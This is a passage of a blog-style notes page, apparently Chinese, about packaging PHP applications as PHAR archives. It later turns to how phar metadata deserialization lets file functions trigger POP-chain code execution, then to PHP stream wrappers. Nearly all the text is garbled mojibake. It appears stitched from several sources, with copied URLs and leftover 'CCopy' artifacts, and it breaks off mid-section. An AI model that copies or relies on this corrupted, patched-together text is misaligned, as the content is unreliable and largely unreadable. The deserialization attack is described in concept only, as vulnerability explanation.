I"št<p>PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œé‚£ä¹ˆPharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä½ ä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>

<p>å¦‚æœä½ ä»¥å‰æ²¡æœ‰ä½¿ç”¨è¿‡Pharæ–‡ä»¶ï¼Œè¿™ç¯‡æ–‡ä»¶å°±æ˜¯è¦ä»‹ç»å…³äºè¿™ç§æ–‡ä»¶çš„ä¸€äº›é‡è¦ç‰¹å¾ã€‚å¸Œæœ›ä½ èƒ½å‘ç°Pharæ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„æŠ€æœ¯ï¼Œèƒ½ç»™ä½ çš„PHPå¼€å‘å’Œéƒ¨ç½²å¸¦æ¥æ›´å¿«æ›´å¥½çš„ä½“éªŒã€‚</p>

<p>PHARæ–‡ä»¶ç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼Œä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„é…ç½®ã€‚éƒ¨ç½²éå¸¸æ–¹ä¾¿ã€‚å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹ php.ini</p>

<p>æ‰“å¼€ php.iniï¼Œæ‰¾åˆ° phar.readonly æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š</p>

<p>phar.readonly = 0
ç°åœ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¥æŠŠPHPåº”ç”¨æ‰“åŒ…æˆPharæ–‡ä»¶äº†ã€‚</p>

<p>åˆ›å»º PHAR æ–‡ä»¶
åœ¨æˆ‘ä»¬çš„PHPåº”ç”¨ç›®å½•é‡Œï¼Œéœ€è¦æœ‰ä¸€ä¸ªåˆ›å»ºPharæ–‡ä»¶çš„è„šæœ¬ï¼Œæˆ‘ä»¬ç»™å®ƒèµ·åå« create-phar.phpï¼Œæ”¾ç½®åˆ° myapp çš„è·Ÿç›®å½•ä¸‹ï¼Œé‡Œé¢æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>

<p>&lt;?php
$srcRoot = â€œ~/myapp/srcâ€;
$buildRoot = â€œ~/myapp/buildâ€;</p>

<p>$phar = new Phar($buildRoot . â€œ/myapp.pharâ€, 
  FilesystemIterator::CURRENT_AS_FILEINFO |       FilesystemIterator::KEY_AS_FILENAME, â€œmyapp.pharâ€);
$phar[â€œindex.phpâ€] = file_get_contents($srcRoot . â€œ/index.phpâ€);
$phar[â€œcommon.phpâ€] = file_get_contents($srcRoot . â€œ/common.phpâ€);
$phar-&gt;setStub($phar-&gt;createDefaultStub(â€œindex.phpâ€));</p>

<p>copy($srcRoot . â€œ/config.iniâ€, $buildRoot . â€œ/config.iniâ€);
æ‰“å¼€å‘½ä»¤è¡Œçª—å£ï¼Œåˆ‡æ¢åˆ° myapp ç›®å½•ä¸‹ï¼Œè¿è¡Œå‘½ä»¤ï¼š</p>

<p>aabouzekry@platinum:~/myapp$ php create-phar.php
è¿è¡Œäº†ä¸Šé¢çš„å‘½ä»¤åï¼Œä½ ä¼šåœ¨ build ç›®å½•é‡Œå‘ç°ä¸€ä¸ª myapp.phar æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€ä¸ªconfig.iniçš„å‰¯æœ¬ã€‚å°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ‹·è´åˆ°WEBæœåŠ¡å™¨çš„æœåŠ¡æ ¹ç›®å½•é‡Œ(e.g. htdocs)ã€‚</p>

<p>æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®Pharæ‰“åŒ…çš„åº”ç”¨ï¼Œä½†è¿™éœ€è¦é¢å¤–é…ç½®web serveræ¥å°†Pharæ–‡ä»¶å‘é€ç»™æ­£ç¡®PHPè§£æå™¨ã€‚å¦å¤–ä¸€ä¸ªåŠæ³•æ˜¯åˆ›å»ºä¸€ä¸ªrunè„šæœ¬ï¼Œinclude è¿™ä¸ªPharæ–‡ä»¶ã€‚</p>

<p>åœ¨web serverçš„æ ¹ç›®å½•åˆ›å»ºä¸€ä¸ªå« run.php çš„PHPè„šæœ¬ï¼š</p>

<p>&lt;?php
require â€œmyapp.pharâ€;
è¿™æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å¯ä»¥è®©ä½ å…å»äº†å»é…ç½®web serveræ¥ç›´æ¥è§£æPharæ–‡ä»¶ã€‚å¦‚æœä½ çš„åº”ç”¨ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå…±äº«çš„è™šæ‹Ÿä¸»æœºï¼Œæ²¡æœ‰æƒé™æ¥é…ç½®web serverï¼Œé‚£ä¹ˆï¼Œè¿™ç§æ–¹å¼æ˜¯ä¸€ä¸ªå®Œç¾çš„è§£å†³æ–¹æ¡ˆã€‚</p>

<p>Pharçš„è¿è¡ŒåŸç†
è®©æˆ‘ä»¬å†é‡æ–°çœ‹ä¸€ä¸‹ create-phar.php ä¸­çš„ä»£ç ï¼Œäº†è§£æ¯æ®µä»£ç çš„ä½œç”¨ã€‚å…ˆçœ‹çœ‹è¿™å‡ è¡Œï¼š</p>

<p>&lt;?php
$phar = new Phar($buildRoot . â€œ/myapp.pharâ€, 
        FilesystemIterator::CURRENT_AS_FILEINFO |
        FilesystemIterator::KEY_AS_FILENAME, â€œmyapp.pharâ€);
ä¸€ä¸ªæ–° Phar å¯¹è±¡çš„åˆ›å»ºé€šå¸¸éœ€è¦ä¸‰ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Pharæ–‡ä»¶çš„è·¯å¾„ã€‚ä½ ä¸ä»…å¯ä»¥é€šè¿‡å®ƒåˆ›å»ºPharæ–‡ä»¶ï¼Œè¿˜å¯ä»¥å¯¹ç°å­˜çš„Pharæ–‡ä»¶è¿›è¡Œæ“ä½œã€‚</p>

<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯è®¾å®š Phar å¯¹è±¡å¦‚ä½•å¤„ç†æ–‡ä»¶ã€‚Phar å¯¹è±¡ç»§æ‰¿äº† PHP RecursiveDirectoryIterator å¯¹è±¡ï¼Œè¿™ä¸ªå‚æ•°æ˜¯ç›´æ¥ä¼ é€’åˆ°çˆ¶ç±»é‡Œã€‚è¿™é‡Œæä¾›çš„å€¼æ˜¯RecursiveDirectoryIterator çš„ç¼ºçœå€¼ï¼Œèƒ½æ»¡è¶³ç›®å‰çš„è¦æ±‚ã€‚</p>

<p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯Pharæ–‡ä»¶çš„åˆ«åï¼Œåœ¨å†…éƒ¨å¼•ç”¨è¿™ä¸ªPharæ–‡ä»¶æ—¶éƒ½è¦ä½¿ç”¨è¿™ä¸ªåˆ«åã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒPharå†…éƒ¨æ–‡ä»¶çš„ç›¸äº’includeéƒ½éœ€è¦æ˜¾å¼çš„ä½¿ç”¨è¿™ä¸ªåˆ«åã€‚ä¾‹å¦‚ï¼Œä¹‹å‰çš„index.php å¯¹ common.php çš„å¼•ç”¨å°±æ˜¯è¿™ç§æ–¹å¼ã€‚</p>

<p>&lt;?php
require_once â€œphar://myapp.phar/common.phpâ€;
åœ¨Pharå¯¹è±¡åˆ›å»ºä¹‹åï¼Œ index.php å’Œ common.php å°±è¢«åŠ å…¥äº†Pharæ–‡ä»¶é‡Œäº†ã€‚Phar å¯¹è±¡æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œfile_get_contents() æ–¹æ³•å°†å„ä¸ªæ–‡ä»¶çš„å†…å®¹è¯»åˆ°æ•°ç»„é‡Œã€‚ä½ å¯ä»¥å‘é‡Œé¢æ·»åŠ å¾ˆå¤šçš„æ–‡ä»¶ï¼Œä½†å¦‚æœä½ è€ƒè™‘æ·»åŠ å¤§é‡çš„æ–‡ä»¶ï¼Œæ¯”å¦‚è¯´æ•´ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä½ å¯ä»¥è€ƒè™‘ä½¿ç”¨æ›´æ–¹ä¾¿çš„ buildFromDirectory() æ–¹æ³•ã€‚</p>

<p>&lt;?php
$phar-&gt;buildFromDirectory(â€œ/path/to/dirâ€,â€™/.php$/â€™);
buildFromDirectory() çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®å½•çš„è·¯å¾„ï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œæ˜¯ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤æ–‡ä»¶çš„ç±»å‹ã€‚å¦‚æœç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½è¦includeï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥å¿½ç•¥ã€‚</p>

<p>setStub() ç”¨æ¥åˆ›å»ºstubæ–‡ä»¶ï¼Œstubæ–‡ä»¶ç”¨æ¥å‘Šè¯‰Pharåœ¨è¢«åŠ è½½æ—¶å¹²ä»€ä¹ˆã€‚</p>

<p>æœ€åï¼Œconfig.ini ä»srcè¢«æ‹·è´åˆ°buildç›®å½•ä¸‹ã€‚</p>

<p>Stubæ–‡ä»¶
è¿è¡ŒPharæ–‡ä»¶æ—¶ï¼Œstubæ–‡ä»¶è¢«å½“åšä¸€ä¸ªmetaæ–‡ä»¶æ¥åˆå§‹åŒ–Pharï¼Œ å¹¶å‘Šè¯‰Pharæ–‡ä»¶åœ¨è¢«è°ƒç”¨æ—¶è¯¥åšä»€ä¹ˆã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œä½¿ç”¨çš„æ˜¯ createDefaultStub() æ–¹æ³•ï¼Œç”Ÿæˆçš„ç¼ºçœstubæ–‡ä»¶åŒ…å«å¦‚ä¸‹çš„ä»£ç ï¼š</p>

<p>&lt;?php
Phar::mapPhar();
include â€œphar://myapp.phar/index.phpâ€;
__HALT_COMPILER();
createDefaultStub() æ–¹æ³•ç¼ºçœåˆ›å»ºçš„stubæ–‡ä»¶çš„å†…å®¹å¾ˆç®€å•ã€‚ Phar::mapPhar() ç”¨æ¥åˆ†æPharæ–‡ä»¶çš„å…ƒæ•°æ®ï¼Œå¹¶åˆå§‹åŒ–å®ƒã€‚stubæ–‡ä»¶çš„ç»“å°¾å¤„éœ€è¦è°ƒç”¨ __HALT_COMPILER() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åä¸èƒ½ç•™ç©ºæ ¼ã€‚__HALT_COMPILER() ä¼šç«‹å³ç»ˆæ­¢PHPçš„è¿è¡Œï¼Œé˜²æ­¢includeçš„æ–‡ä»¶åœ¨æ­¤æ–¹æ³•åä»ç„¶æ‰§è¡Œã€‚è¿™æ˜¯Pharå¿…é¡»çš„ï¼Œæ²¡æœ‰å®ƒPharå°†ä¸èƒ½æ­£å¸¸è¿è¡Œã€‚</p>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ›å»ºè‡ªå·±çš„stubæ–‡ä»¶æ¥æ‰§è¡Œè‡ªå®šä¹‰çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œåƒè¿™æ ·åŠ è½½è‡ªå®šä¹‰æ–‡ä»¶ï¼š</p>

<p>&lt;?php
$phar-&gt;setStub(file_get_contents(â€œstub.phpâ€));
Pharæ–‡ä»¶çš„ä¸€äº›ç¼ºé™·
å¦‚æœä½ å¼€å‘çš„ç±»åº“æˆ–å¯å¼•ç”¨ç¨‹åºéœ€è¦è¢«å¤šä¸ªé¡¹ç›®ä½¿ç”¨ï¼ŒæŠŠå®ƒæ‰“åŒ…æˆPharæ–‡ä»¶æ˜¯ä¸€ä¸ªçœäº‹çš„è§£å†³æ–¹æ¡ˆã€‚Pharæ–‡ä»¶æ˜¯ç»è¿‡é«˜åº¦ä¼˜åŒ–è¿‡çš„ï¼Œå®ƒå’Œæ™®é€šæ–‡ä»¶çš„æ‰§è¡Œæ•ˆç‡ç›¸æ¯”å®Œå…¨ä¸å¼±ï¼Œæ‰€ä»¥ï¼Œä½ ä¸éœ€è¦æ‹…å¿ƒæ•ˆç‡é—®é¢˜ã€‚</p>

<p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒPharæ–‡ä»¶çš„ä½¿ç”¨æœ‰ä¸€äº›é™åˆ¶ã€‚ä¸‹é¢æ˜¯ä¸€äº›æç¤ºè®©ä½ æ›´å¥½çš„ç†è§£å®ƒï¼š</p>

<p>æˆ‘ä»¬å¯ä»¥æ•´ä¸ªåº”ç”¨éƒ½æ‰“åŒ…åˆ°ä¸€ä¸ªPharæ–‡ä»¶é‡Œï¼Œä½†Pharåªæä¾›äº†ä¸€ä¸ªå•ä¸€å…¥å£ã€‚
åœ¨ç”Ÿäº§ç¯å¢ƒé‡Œï¼Œæˆ‘ä»¬åº”è¯¥é¿å…å°†ä¸œè¥¿å›å†™è¿›Pharï¼Œæˆ‘ä»¬åº”è¯¥å°†å“ªäº›å¯èƒ½è¢«ä¿®æ”¹çš„æ–‡ä»¶æ”¾åˆ°Pharä¹‹å¤–ï¼Œåœ¨æ ‡å‡†PHPå®‰è£…é‡Œï¼ŒPharæ˜¯ä¸å…è®¸å›å†™çš„ï¼Œå› ä¸ºå®‰å…¨é—®é¢˜ã€‚
https://xts.so/lang/pack-the-php-project-as-executable-phar.html
<!-- more -->
æˆ‘ä»¬ç›´æ¥é˜…è¯»PHPæºç ã€‚åœ¨ phar.c#L618 å¤„ï¼Œå…¶è°ƒç”¨äº†php_var_unserializeã€‚</p>

<p>if (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) {
CCopy
å› æ­¤å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„pharåŒ…ï¼Œä½¿å¾—æ”»å‡»ä»£ç èƒ½å¤Ÿè¢«ååºåˆ—åŒ–ï¼Œä»è€Œæ„é€ ä¸€ä¸ªPOPé“¾ã€‚è¿™ä¸€éƒ¨åˆ†å·²ç»å¤ªå¸¸è§äº†ï¼ŒCTFæ¯”èµ›ä¸­éƒ½å‡ºçƒ‚äº†ï¼Œæ²¡ä»€ä¹ˆå€¼å¾—ç»§ç»­è®¨è®ºçš„ã€‚å€¼å¾—å…³æ³¨çš„æ˜¯åˆ°åº•ä¸ºä»€ä¹ˆfile_get_contentsèƒ½å¤Ÿå®ç°RCEã€‚</p>

<p>Stream API
å› æ­¤ï¼Œä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆé˜…è¯»æ­¤å‡½æ•°çš„æºç ã€‚å¤§æ¦‚åœ¨æ­¤å¤„ï¼šhttps://github.com/php/php-src/blob/PHP-7.2.11/ext/standard/file.c#L548 ï¼Œé‡ç‚¹å…³æ³¨æ­¤è¡Œï¼š</p>

<p>stream = php_stream_open_wrapper_ex(filename, â€œrbâ€,
            (use_include_path ? USE_PATH : 0) | REPORT_ERRORS,
            NULL, context);
CCopy
å¯ä»¥æ³¨æ„ï¼Œå…¶ä½¿ç”¨çš„æ˜¯php_streamç³»åˆ—APIæ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ã€‚é˜…è¯»PHPçš„è¿™ç¯‡æ–‡æ¡£ï¼šStreams API for PHP Extension Authorsï¼Œå¯çŸ¥ï¼ŒStream APIæ˜¯PHPä¸­ä¸€ç§ç»Ÿä¸€çš„å¤„ç†æ–‡ä»¶çš„æ–¹æ³•ï¼Œå¹¶ä¸”å…¶è¢«è®¾è®¡ä¸ºå¯æ‰©å±•çš„ï¼Œå…è®¸ä»»æ„æ‰©å±•ä½œè€…ä½¿ç”¨ã€‚è€Œæœ¬æ¬¡äº‹ä»¶çš„ä¸»è§’ï¼Œä¹Ÿå°±æ˜¯pharè¿™ä¸ªæ‰©å±•ï¼Œå…¶å°±æ³¨å†Œäº†phar://è¿™ä¸ªstream wrapperã€‚å¯ä»¥ä½¿ç”¨stream_get_wrapperçœ‹åˆ°ç³»ç»Ÿå†…æ³¨å†Œäº†å“ªä¸€äº›wrapperï¼Œä½†å…¶ä½™çš„æ²¡ä»€ä¹ˆå€¼å¾—å…³æ³¨çš„ã€‚</p>

<p>å› æ­¤ï¼Œæˆ‘ä»¬å‘ç°ï¼Œä¸€ä¸ª stream wrapperï¼Œå®ƒæ”¯æŒä»¥ä¸‹åŠŸèƒ½ï¼šæ‰“å¼€æ–‡ä»¶ï¼ˆå¤¹ï¼‰ã€åˆ é™¤æ–‡ä»¶ï¼ˆå¤¹ï¼‰ã€é‡å‘½åæ–‡ä»¶ï¼ˆå¤¹ï¼‰ï¼Œä»¥åŠè·å–æ–‡ä»¶çš„metaã€‚æˆ‘ä»¬å¾ˆå®¹æ˜“å°±èƒ½æ–­å®šï¼Œç±»ä¼¼unlinkç­‰å‡½æ•°ä¹Ÿæ˜¯åŒæ ·é€šè¿‡è¿™ä¸ª streams api è¿›è¡Œæ“ä½œã€‚</p>

<p>Sam Thomas çš„ pdf æŒ‡å‡º</p>

<p>This is true for both direct file operations (such as
â€œfile_existsâ€) and indirect operations such as those that occur during external entity processing
within XML (i.e. when an XXE vulnerability is being exploited).</p>

<p>æˆ‘ä»¬é€šè¿‡è¯•éªŒä¹Ÿå¾ˆå®¹æ˜“å‘ç°ï¼Œç±»ä¼¼unlinkç­‰å‡½æ•°ä¹Ÿå‡æ˜¯å¯ä»¥ä½¿ç”¨çš„
https://blog.zsxsoft.com/post/38</p>

<p>æµStreamsè¿™ä¸ªæ¦‚å¿µæ˜¯åœ¨php4.3å¼•è¿›çš„ï¼Œæ˜¯å¯¹æµå¼æ•°æ®çš„æŠ½è±¡ï¼Œç”¨äºç»Ÿä¸€æ•°æ®æ“ä½œï¼Œæ¯”å¦‚æ–‡ä»¶æ•°æ®ã€ç½‘ç»œæ•°æ®ã€å‹ç¼©æ•°æ®ç­‰ï¼Œä»¥ä½¿å¯ä»¥å…±äº«åŒä¸€å¥—å‡½æ•°ï¼Œ</p>

<p>phpçš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°å°±æ˜¯è¿™æ ·çš„å…±äº«ï¼Œæ¯”å¦‚file_get_contents()å‡½æ•°å³å¯æ‰“å¼€æœ¬åœ°æ–‡ä»¶ä¹Ÿå¯ä»¥è®¿é—®urlå°±æ˜¯è¿™ä¸€ä½“ç°ã€‚ç®€å•ç‚¹è®²ï¼Œæµå°±æ˜¯è¡¨ç°å‡ºæµå¼æ•°æ®è¡Œä¸ºçš„èµ„æºå¯¹è±¡ã€‚
ä»¥çº¿æ€§æ–¹å¼è¿›è¡Œè¯»å†™ï¼Œå¹¶å¯ä»¥åœ¨æµé‡Œé¢ä»»æ„ä½ç½®è¿›è¡Œæœç´¢ã€‚
æµæœ‰ç‚¹ç±»ä¼¼æ•°æ®åº“æŠ½è±¡å±‚ï¼Œåœ¨æ•°æ®åº“æŠ½è±¡å±‚æ–¹é¢ï¼Œä¸ç®¡ä½¿ç”¨ä½•ç§æ•°æ®åº“ï¼Œåœ¨æŠ½è±¡å±‚ä¹‹ä¸Šéƒ½ä½¿ç”¨ç›¸åŒçš„æ–¹å¼æ“ä½œæ•°æ®ï¼Œ
è€Œæµæ˜¯å¯¹æ•°æ®çš„æŠ½è±¡ï¼Œå®ƒä¸ç®¡æ˜¯æœ¬åœ°æ–‡ä»¶è¿˜æ˜¯è¿œç¨‹æ–‡ä»¶è¿˜æ˜¯å‹ç¼©æ–‡ä»¶ç­‰ç­‰ï¼Œåªè¦æ¥çš„æ˜¯æµå¼æ•°æ®ï¼Œé‚£ä¹ˆæ“ä½œæ–¹å¼å°±æ˜¯ä¸€æ ·çš„
æœ‰äº†æµè¿™ä¸ªæ¦‚å¿µå°±å¼•ç”³å‡ºäº†åŒ…è£…å™¨wrapperè¿™ä¸ªæ¦‚å¿µï¼Œæ¯ä¸ªæµéƒ½å¯¹åº”ä¸€ç§åŒ…è£…å™¨ï¼Œ
æµæ˜¯ä»ç»Ÿä¸€æ“ä½œè¿™ä¸ªè§’åº¦äº§ç”Ÿçš„ä¸€ä¸ªæ¦‚å¿µï¼Œè€ŒåŒ…è£…å™¨å‘¢æ˜¯ä»ç†è§£æµæ•°æ®å†…å®¹å‡ºå‘äº§ç”Ÿçš„ä¸€ä¸ªæ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªç»Ÿä¸€çš„æ“ä½œæ–¹å¼æ€ä¹ˆæ“ä½œæˆ–é…ç½®ä¸åŒçš„å†…å®¹ï¼›
è¿™äº›å†…å®¹éƒ½æ˜¯ä»¥æµçš„æ–¹å¼å‘ˆç°ï¼Œä½†å†…å®¹è§„åˆ™æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ¯”å¦‚httpåè®®ä¼ æ¥çš„æ•°æ®æ˜¯æµçš„æ–¹å¼ï¼Œä½†åªæœ‰httpåŒ…è£…å™¨æ‰ç†è§£httpåè®®ä¼ æ¥çš„æ•°æ®çš„æ„æ€ï¼Œ
å¯ä»¥è¿™ä¹ˆç†è§£ï¼Œæµå°±æ˜¯ä¸€æ ¹æµæ°´çš„ç®¡å­ï¼Œåªä¸è¿‡å®ƒæµå‡ºçš„æ˜¯æ•°æ®ï¼ŒåŒ…è£…å™¨å°±æ˜¯å¥—åœ¨æµè¿™æ ¹ç®¡å­å¤–å±‚çš„ä¸€ä¸ªè§£é‡Šè€…ï¼Œå®ƒç†è§£æµå‡ºçš„æ•°æ®çš„æ„æ€ï¼Œå¹¶èƒ½æ“ä½œå®ƒ</p>

<p>å®˜æ–¹æ‰‹å†Œè¯´ï¼šâ€œä¸€ä¸ªåŒ…è£…å™¨æ˜¯å‘Šè¯‰æµæ€ä¹ˆå¤„ç†ç‰¹æ®Šåè®®æˆ–ç¼–ç çš„é™„åŠ ä»£ç â€æ˜ç™½è¿™å¥è¯çš„æ„æ€äº†å—ï¼Ÿ</p>

<p>åŒ…è£…å™¨å¯ä»¥åµŒå¥—ï¼Œä¸€ä¸ªæµå¤–é¢åŒ…è£¹äº†ä¸€ä¸ªåŒ…è£…å™¨åï¼Œè¿˜å¯ä»¥åœ¨å¤–å±‚ç»§ç»­åŒ…è£¹åŒ…è£…å™¨ï¼Œè¿™ä¸ªæ—¶å€™é‡Œå±‚çš„åŒ…è£…å™¨ç›¸å¯¹äºå¤–å±‚çš„åŒ…è£…å™¨å……å½“æµçš„è§’è‰²</p>

<p>åœ¨phpè‡ªèº«åº•å±‚å®ç°çš„cè¯­è¨€å¼€å‘æ–‡æ¡£æœ‰è¿™æ ·çš„è§£é‡Šï¼š
æµAPIæ“ä½œä¸€å¯¹ä¸åŒçº§åˆ«ï¼šåœ¨åŸºæœ¬çº§åˆ«ï¼Œapiå®šä¹‰äº†php_streamå¯¹è±¡è¡¨ç¤ºæµå¼æ•°æ®æºï¼Œåœ¨ç¨å¾®é«˜ä¸€ç‚¹çš„çº§åˆ«ï¼Œapiå®šä¹‰äº†php_stream_wrapperå¯¹è±¡
å®ƒåŒ…è£¹ä½ä¸€çº§åˆ«çš„php_streamå¯¹è±¡ï¼Œä»¥æä¾›å–å›URLçš„å†…å®¹å’Œå…ƒæ•°æ®ã€æ·»åŠ ä¸Šä¸‹æ–‡å‚æ•°çš„èƒ½åŠ›ï¼Œè°ƒæ•´åŒ…è£…å™¨è¡Œä¸ºï¼›</p>

<p>æ¯ä¸€ç§æµæ‰“å¼€åéƒ½å¯ä»¥åº”ç”¨ä»»æ„æ•°é‡çš„è¿‡æ»¤å™¨åœ¨ä¸Šé¢ï¼Œæµæ•°æ®ä¼šç»è¿‡è¿‡æ»¤å™¨çš„å¤„ç†ï¼Œç¬”è€…è®¤ä¸ºè¿‡æ»¤å™¨è¿™ä¸ªè¯ç”¨å¾—æœ‰ç‚¹ä¸å‡†ç¡®ï¼Œæœ‰äº›è¯¯å¯¼äºº
ä»å­—é¢æ„æ€çœ‹å¥½åƒæ˜¯å»æ‰ä¸€äº›æ•°æ®çš„æ„Ÿè§‰ï¼Œåº”è¯¥ç§°ä¸ºæ•°æ®è°ƒæ•´å™¨ï¼Œå› ä¸ºå®ƒæ—¢å¯å»æ‰ä¸€äº›æ•°æ®ï¼Œä¹Ÿå¯ä»¥æ·»åŠ ï¼Œè¿˜å¯ä»¥ä¿®æ”¹ï¼Œä½†å†å²åŸå› çº¦å®šä¿—æˆï¼Œ
ä¹Ÿå°±ç§°ä¸ºè¿‡æ»¤å™¨äº†ï¼Œå¤§å®¶å¿ƒé‡Œæ˜ç™½å°±å¥½ã€‚</p>

<p>æˆ‘ä»¬ç»å¸¸çœ‹åˆ°ä¸‹é¢çš„è¯ï¼Œæ¥è§£é‡Šä¸‹ä»–ä»¬çš„åŒºåˆ«ï¼š
èµ„æºå’Œæ•°æ®ï¼šèµ„æºæ˜¯æ¯”è¾ƒå®è§‚çš„è¯´æ³•ï¼Œé€šå¸¸åŒ…å«æ•°æ®ï¼Œè€Œæ•°æ®æ˜¯æ¯”è¾ƒå…·è±¡çš„è¯´æ³•ï¼Œåœ¨å¼€å‘ç¨‹åºçš„æ—¶å€™ç»å¸¸è¯´æ˜¯æ•°æ®ï¼Œè€Œåœ¨è½¯ä»¶è§„åˆ’æ—¶è¯´æ˜¯èµ„æºï¼Œä»–ä»¬æ˜¯è¿‘ä¹‰è¯ï¼Œå°±åƒè½¯ä»¶è®¾è®¡å’Œç¨‹åºå¼€å‘çš„åŒºåˆ«ä¸€æ ·ã€‚
ä¸Šä¸‹æ–‡å’Œå‚æ•°ï¼šä¸Šä¸‹æ–‡æ˜¯æ¯”è¾ƒå®è§‚çš„è¯´æ³•ï¼Œç»å¸¸ç”¨åœ¨æ²Ÿé€šä¸Šé¢ï¼Œå…·ä½“ç‚¹è®²å°±æ˜¯ä¸€æ¬¡æ²Ÿé€šæœ¬èº«çš„å‚æ•°ï¼Œè€Œå‚æ•°è¿™ä¸ªè¯´æ³•å¾€å¾€ç”¨åœ¨æ¯”è¾ƒå…·ä½“çš„äº‹æƒ…ä¸Šé¢ï¼Œæ¯”å¦‚è¯´å‡½æ•°</p>

<p>ä¸Šé¢è§£é‡Šäº†æ¦‚å¿µæ€§çš„ä¸œè¥¿ï¼Œä¸‹é¢æ¥çœ‹çœ‹å…·ä½“å†…å®¹ï¼š</p>

<p>phpæ”¯æŒçš„åè®®å’ŒåŒ…è£…å™¨è¯·çœ‹è¿™é‡Œï¼šhttp://php.net/manual/zh/wrappers.phpï¼š</p>

<p>ï¼ˆç¬”è€…æ³¨ï¼šåŸæ ‡é¢˜æ˜¯ï¼šæ”¯æŒçš„åè®®å’Œå°è£…åè®®ï¼Œä¸­æ–‡ç¿»è¯‘æœ‰ç‚¹è¯¯å¯¼ï¼Œå‡†ç¡®çš„è®²å°±æ˜¯æ”¯æŒçš„åè®®å’ŒåŒ…è£…å™¨ï¼Œä»è‹±æ–‡ç‰ˆé¢å°±å¾ˆæ¸…æ¥šï¼‰</p>

<p>é»˜è®¤çš„æ”¯æŒäº†ä¸€äº›åè®®å’ŒåŒ…è£…å™¨ï¼Œè¯·ç”¨stream_get_wrappers()å‡½æ•°æŸ¥çœ‹.ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªåŒ…è£…å™¨ï¼Œç”¨stream_wrapper_register()æ³¨å†Œ</p>

<p>å°½ç®¡RFC 3986é‡Œé¢å¯ä»¥ä½¿ç”¨:åšåˆ†å‰²ç¬¦ï¼Œä½†phpåªå…è®¸://ï¼Œæ‰€ä»¥urlè¯·ä½¿ç”¨â€scheme://targetâ€è¿™æ ·çš„æ ¼å¼</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨ç”¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°æ—¶é»˜è®¤å°±ä½¿ç”¨è¯¥åŒ…è£…å™¨
http:// â€” è®¿é—® HTTP(s) ç½‘å€
ftp:// â€” è®¿é—® FTP(s) URLs
php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰
zlib:// â€” å‹ç¼©æµ
data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰
glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼
phar:// â€” PHP å½’æ¡£
ssh2:// â€” Secure Shell 2
rar:// â€” RAR
ogg:// â€” éŸ³é¢‘æµ
expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ
</code></pre></div></div>

<p>å¦‚ä½•å®ç°ä¸€ä¸ªè‡ªå®šä¹‰çš„åŒ…è£…å™¨ï¼š</p>

